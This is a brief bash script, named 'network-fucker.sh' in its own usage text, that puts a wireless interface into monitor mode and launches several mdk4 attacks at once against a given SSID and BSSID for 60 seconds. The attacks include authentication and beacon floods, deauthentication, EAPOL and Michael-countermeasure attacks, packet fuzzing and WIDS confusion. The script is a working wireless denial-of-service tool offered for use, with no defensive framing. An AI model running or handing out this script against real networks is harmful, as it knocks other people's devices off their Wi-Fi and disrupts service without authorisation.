#!/usr/bin/env bash

TIMEOUT=60
SSID="${1:?usage: network-fucker.sh <SSID> <BSSID> [interface]}"
BSSID="${2:?usage: network-fucker.sh <SSID> <BSSID> [interface]}"
IFACE="${3:-wlan0}"
MON="${IFACE}mon"

sudo airmon-ng start "$IFACE" 1

sudo mdk4 "$MON" a &
sudo mdk4 "$MON" b &
sudo mdk4 "$MON" d &
sudo mdk4 "$MON" e -t "$BSSID" &
sudo mdk4 "$MON" f -s a -m s -p 1000 &
sudo mdk4 "$MON" m -t "$BSSID" &
sudo mdk4 "$MON" w -e "$SSID" &

sleep $TIMEOUT

sudo pkill mdk4
sudo pkill wrk

sudo airmon-ng stop "$MON"
